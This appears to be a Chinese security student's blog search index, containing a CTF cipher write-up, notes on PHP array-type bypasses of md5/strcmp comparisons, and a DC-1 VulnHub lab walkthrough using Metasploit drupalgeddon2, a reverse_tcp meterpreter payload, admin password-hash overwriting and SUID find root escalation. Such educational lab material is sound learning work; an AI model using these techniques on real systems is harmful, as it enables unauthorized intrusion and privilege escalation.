","date":"2023-09-17","objectID":"/articles/2023/09/wp-susctf%E6%8B%9B%E6%96%B0%E9%A2%98%E7%9B%AE-misc/:2:0","tags":["CTF","Misc","WriteUp"],"title":"WP-SUSCTF招新题目-Misc","uri":"/articles/2023/09/wp-susctf%E6%8B%9B%E6%96%B0%E9%A2%98%E7%9B%AE-misc/"},{"categories":["Misc"],"content":"0x03 解密 通过Python进行自动化解密（这里面的字典可以自己添加） dh = '田口由中人工大土士王夫井羊壮天' ds = '001234555678996' cip = '士人 大土 大人 中口 中人 人工 夫羊 中田 夫夫 人人 人由 天人 人口 中人 王大 中口 夫大' s = '' for i in cip: if i in dh: s += ds[dh.index(i)] else: s += ' ' print(s) 最后得到： 53 55 53 20 23 34 79 20 77 33 31 63 30 23 65 20 75 按照当铺密码的一般操作，这些数字应该代表ascii码，但是观察发现，其中20、23这些数字过小，在ASCII码中属于不可见字符，遂考虑进制转换。由于出现了79这个数字，故不可能是8进制，于是考虑16进制。于是参照以下对照表： 得到明文为： SUS #4y w31c0#e u ","date":"2023-09-17","objectID":"/articles/2023/09/wp-susctf%E6%8B%9B%E6%96%B0%E9%A2%98%E7%9B%AE-misc/:3:0","tags":["CTF","Misc","WriteUp"],"title":"WP-SUSCTF招新题目-Misc","uri":"/articles/2023/09/wp-susctf%E6%8B%9B%E6%96%B0%E9%A2%98%E7%9B%AE-misc/"},{"categories":["Web"],"content":"简介 记录PHP可以使用数组进行绕过的一些函数，保持更新 ","date":"2023-09-17","objectID":"/articles/2023/09/php%E4%B8%AD%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0/:1:0","tags":["PHP","CTF","网络安全","Web"],"title":"PHP中数组绕过的一些函数","uri":"/articles/2023/09/php%E4%B8%AD%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0/"},{"categories":["Web"],"content":"0x01 md5() if (isset($_GET['a']) and isset($_GET['b'])) { if ($_GET['a'] != $_GET['b']) if (md5($_GET['a']) === md5($_GET['b'])) die('Flag: '.$flag); else print 'Wrong.'; } md5处理不了数组类型的数据，将直接返回null（注意：null != false），null==null，成功绕过 md5(array()) = null ","date":"2023-09-17","objectID":"/articles/2023/09/php%E4%B8%AD%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0/:2:0","tags":["PHP","CTF","网络安全","Web"],"title":"PHP中数组绕过的一些函数","uri":"/articles/2023/09/php%E4%B8%AD%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0/"},{"categories":["Web"],"content":"0x02 strcmp() $pass=@$_POST['pass']; $pass1=***********;//被隐藏起来的密码 if(isset($pass)) { if(@!strcmp($pass,$pass1)){ echo \"flag:nctf{*}\"; }else{ echo \"the pass is wrong!\"; } }else{ echo \"please input pass!\"; } strcmp函数用于字符串的比较 int strcmp ( string $str1 , string $str2 ) 返回值：如果 str1 小于 str2 返回 \u003c 0； 如果 str1 大于 str2 返回 \u003e 0；如果两者相等，返回 0。 5.2 中是将两个参数先转换成string类型。 5.3.3 以后，当比较数组和字符串的时候，返回是0。 5.5 中如果参数不是string类型，直接return了 strcmp(array(), \"abc\") = null ","date":"2023-09-17","objectID":"/articles/2023/09/php%E4%B8%AD%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0/:3:0","tags":["PHP","CTF","网络安全","Web"],"title":"PHP中数组绕过的一些函数","uri":"/articles/2023/09/php%E4%B8%AD%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0/"},{"categories":["Web"],"content":"0x03 strpos() 基本同strcmp strpos(array(), \"abc\") = null ","date":"2023-09-17","objectID":"/articles/2023/09/php%E4%B8%AD%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0/:4:0","tags":["PHP","CTF","网络安全","Web"],"title":"PHP中数组绕过的一些函数","uri":"/articles/2023/09/php%E4%B8%AD%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0/"},{"categories":["Web"],"content":"0x04 ereg() ereg()有两种利用方式 00截断（已被preg_match替代） 已被preg_match替代 ereg(pattern,array()) = null ","date":"2023-09-17","objectID":"/articles/2023/09/php%E4%B8%AD%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0/:5:0","tags":["PHP","CTF","网络安全","Web"],"title":"PHP中数组绕过的一些函数","uri":"/articles/2023/09/php%E4%B8%AD%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0/"},{"categories":["Web"],"content":"0x05 preg_match() preg_match(pattern,array) = false preg_match()返回 pattern 的匹配次数。 它的值将是0次（不匹配）或1次，因为preg_match()在第一次匹配后 将会停止搜索。preg_match_all()不同于此，它会一直搜索subject 直到到达结尾。 如果发生错误preg_match()返回 FALSE。 ","date":"2023-09-17","objectID":"/articles/2023/09/php%E4%B8%AD%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0/:6:0","tags":["PHP","CTF","网络安全","Web"],"title":"PHP中数组绕过的一些函数","uri":"/articles/2023/09/php%E4%B8%AD%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0/"},{"categories":["渗透"],"content":"0x00 DC-1介绍 DC-1是一个专门建造的易受攻击的实验室，目的是在渗透测试领域获得经验。 它旨在对初学者来说是一个挑战，但它的难易程度取决于您的技能和知识以及您的学习能力。 要成功完成这一挑战，您需要 Linux 技能、熟悉 Linux 命令行以及基本渗透测试工具的经验，例如可以在 Kali Linux 或 Parrot Security OS 上找到的工具。 有多种方法可以扎根，但是，我包括了一些包含初学者线索的标志。 总共有五个标志，但最终目标是在 root 的主目录中查找并读取该标志。您甚至不需要是 root 用户即可执行此操作，但是，您将需要 root 权限。 根据您的技能水平，您也许可以跳过查找大多数这些标志并直接进入root。 初学者可能会遇到以前从未遇到过的挑战，但谷歌搜索应该是获得完成此挑战所需的信息所需的全部内容。 下载地址：https://vulnhub.com/entry/dc-1,292/ ","date":"2023-09-03","objectID":"/articles/2023/09/dc-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/:1:0","tags":["安全","渗透","Web安全","Linux"],"title":"DC-1靶机渗透实战","uri":"/articles/2023/09/dc-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/"},{"categories":["渗透"],"content":"0x01 信息搜集 使用arp-scan扫描内网存活主机 本机ip是128，所以130很可能是我们需要找的主机。这里可以用nmap再扫一下C段确认一下，我是直接nmap 130 nmap扫描主机开放端口 比较有用的就是22的ssh端口，可以尝试寻找密码或者爆破进入，还有80端口，一个使用Apache搭建的web服务器。 查看web服务器 发现一个登录界面，尝试几组弱口令无效。 使用dirb扫描后台地址，发现admin页面，但是未授权访问禁止。 查看网站banner信息，发现所用CMS为Drupal7，网上查询发现Drupal7存在很多漏洞，这里就准备进入msf直接exploit。 ","date":"2023-09-03","objectID":"/articles/2023/09/dc-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/:2:0","tags":["安全","渗透","Web安全","Linux"],"title":"DC-1靶机渗透实战","uri":"/articles/2023/09/dc-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/"},{"categories":["渗透"],"content":"0x02 msf exploit 进入msfconsole，search drupal，发现确实有几个可以利用的漏洞 这里建议根据rank选择较新的漏洞，（后来试了其他漏洞基本不可用)，选择编号为1的exploit/unix/webapp/drupal_drupalgeddon2漏洞利用。然后配置相应选项。这里的payload就使用默认的php/meterpreter/reverse_tcp。这里发现本机信息已经自动填好，填上被攻击机的ip和端口即可。即： set rhosts 192.168.253.130 不存在代理什么的，那么填完直接利用。等待一会，攻击成功，进入meterpreter。这时干什么都行了，赶紧看看当前用户和目录下的文件。 ","date":"2023-09-03","objectID":"/articles/2023/09/dc-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/:3:0","tags":["安全","渗透","Web安全","Linux"],"title":"DC-1靶机渗透实战","uri":"/articles/2023/09/dc-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/"},{"categories":["渗透"],"content":"0x03 后渗透 meterpreter自带的shell非常不方便，这时使用python创建一个可交互的终端 python -c 'import pty; pty.spawn(\"/bin/bash\")' 此时发现flag1，打开flag1，提示我们需要找CMS的配置文件 在网上搜素，发现drupal的配置文件应该在sites文件夹中的一个叫setting.php的文件中，于是查找。发现在sites/default/下有该文件，打开后发现flag2，提示我们需要获得网站权限。配置文件中有包含该网站数据库的信息，于是进入数据 库寻找网站的登录信息。 找到数据库drupaldb，表users，发现其中有两个用户，我们比较关心的是用户名和密码，于是 select uid,name,pass from users; 得到 发现有两个用户，并且密码都是加密的，看密文中都是$S$D开头，不像是我们已知的常见编码形式。 上网查找，发现Drupal使用一种名为Phpass的加密算法，并且告诉我们加密的脚本位于script/password-hash.sh。这样我们可以直接修改admin的密文即可。 ./password-hash.sh \"1234\" 这里注意要cp一份到www目录，因为脚本需要include目录，而include在www目录。 得到密文 $S$DGAsy9C181OKmGr.Hm.Pkf31BVLsDVMURQhoTMRDniH16ThmZsVq 回到mysql直接更改admin的密码。 ![更改密码(https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/111294999360411eb5935fa82a2411ed.png) 修改完成后直接登录后台，使用admin 1234。 在content中发现flag3，提示我们查看shadow文件，并使用find -exec 提权。 回到终端，发现find确实有suid。 同时查看shadow文件，（/etc/shadow） 不给看。那就直接提权。 find /etc/shadow -exec '/bin/sh' \\; 提权成功。查看shadow，发现flag4用户，切换到flag4的家目录，发现flag4。 同时提示我们第五个flag在root的家目录中，我们已经是root了，在家目录下寻找即可： 成功找到5个flag。 ","date":"2023-09-03","objectID":"/articles/2023/09/dc-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/:4:0","tags":["安全","渗透","Web安全","Linux"],"title":"DC-1靶机渗透实战","uri":"/articles/2023/09/dc-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/"},{"categories":["Hugo"],"content":"This is the post for functional testings. Hello World ","date":"2023-09-01","objectID":"/articles/2023/09/hello-world/:0:0","tags":["Hugo","Blog"],"title":"Hello World","uri":"/articles/2023/09/hello-world/"},{"categories":["Hugo"],"content":"2-nd title Hello, world! ","date":"2023-09-01","objectID":"/articles/2023/09/hello-world/:1:0","tags":["Hugo","Blog"],"title":"Hello World","uri":"/articles/2023/09/hello-world/"},{"categories":["Hugo"],"content":"code from pwn import * context(arch='amd64',os='linux') context.terminal=['tmux','splitw','-h'] #include \u003ciostream\u003e #include \u003ccstdio\u003e using namespace std; int main() { cout \u003c\u003c \"Hello, world!\"; return 0; } echo 'inline code'; I need some long java code to test. import java.util.ArrayList; import java.util.Scanner; class TodoApp { private ArrayList\u003cString\u003e todoList; public TodoApp() { todoList = new ArrayList\u003c\u003e(); } public void addTask(String task) { todoList.add(task); System.out.println(\"任务 '\" + task + \"' 已添加到待办事项列表。\"); } public void viewTasks() { if (todoList.isEmpty()) { System.out.println(\"待办事项列表为空。\"); } else { System.out.println(\"待办事项列表:\"); for (int i = 0; i \u003c todoList.size(); i++) { System.out.println((i + 1) + \". \" + todoList.get(i)); } } } public void removeTask(int taskIndex) { if (taskIndex \u003e= 1 \u0026\u0026 taskIndex \u003c= todoList.size()) { String removedTask = todoList.remove(taskIndex - 1); System.out.println(\"任务 '\" + removedTask + \"' 已从待办事项列表中移除。\"); } else { System.out.println(\"无效的任务索引。\"); } } } public class Main { public static void main(String[] args) { TodoApp todoApp = new TodoApp(); Scanner scanner = new Scanner(System.in); while (true) { System.out.println(\"\\n待办事项应用\"); System.out.println(\"1. 添加任务\"); System.out.println(\"2. 查看任务\"); System.out.println(\"3. 移除任务\"); System.out.println(\"4. 退出\"); System.out.print(\"请选择操作: \"); String choice = scanner.next(); if (\"1\".equals(choice)) { System.out.print(\"请输入任务名称: \"); String task = scanner.next(); todoApp.addTask(task); } else if (\"2\".equals(choice)) { todoApp.viewTasks(); } else if (\"3\".equals(choice)) { System.out.print(\"请输入要移除的任务索引: \"); int taskIndex = scanner.nextInt(); todoApp.removeTask(taskIndex); } else if (\"4\".equals(choice)) { break; } else { System.out.println(\"无效的选项，请重新选择。\"); } } scanner.close(); } } ","date":"2023-09-01","objectID":"/articles/2023/09/hello-world/:2:0","tags":["Hugo","Blog"],"title":"Hello World","uri":"/articles/2023/09/hello-world/"},{"categories":["Hugo"],"content":"math $sin(x^2)$ $\\int u \\frac{\\mathrm{d}v}{\\mathrm{d}x},\\mathrm{d}x=uv-\\int \\frac{\\mathrm{d}u}{\\mathrm{d}x}v,\\mathrm{d}x $ $f(x) = \\int_{-\\infty}^\\infty \\hat f(x)\\xi,e^{2 \\pi i \\xi x} ,\\mathrm{d}\\xi$ $\\ce{SO4^2- + Ba^2+ -\u003e BaSO4 v}$ Test page This is a quote. 技巧\r当你运行 hugo server 时，当文件内容更改时，页面会随着更改自动刷新。\rTypora don’t make it. “在未来的数字时代，人工智能将继续深刻地改变我们的生活。机器学习算法将变得更加智能，自动驾驶汽车将成为常态，医疗保健将变得更加精确，而人们将与虚拟现实世界互动，不仅仅是在娱乐领域，还包括教育和工作。这个数字化的未来将带来无限的可能性，但也需要我们审慎思考和管理与之相关的伦理和隐私问题。” ","date":"2023-09-01","objectID":"/articles/2023/09/hello-world/:3:0","tags":["Hugo","Blog"],"title":"Hello World","uri":"/articles/2023/09/hello-world/"},{"categories":null,"content":"whoami ID：a1extang SEU InfoSec研二在读。SUS Team Pwn手。 因为刚从算法转来安全，现在是属于什么都不懂的状态，而且明明会的很少还是要选Pwn🤣👉（可能和方向有关）。 这里记录学习CS和CyberSecurity的路程，还会有一些比赛的WriteUp。 没人看的博客也要打理的很好😎，会一直更新。 希望有一天能变强。 ","date":"0001-01-01","objectID":"/about/:1:0","tags":null,"title":"关于","uri":"/about/"},{"categories":null,"content":"friends\u0026hackers {Team}: Security Union of SEU {Crypto}: Lazzaro {Pwn}: Cyberangel {Dev}: class0ver {Dev}: Yanagi’s blog {Web}: r1ckyL’s secret {Web}: end3av0r ","date":"0001-01-01","objectID":"/about/:2:0","tags":null,"title":"关于","uri":"/about/"}]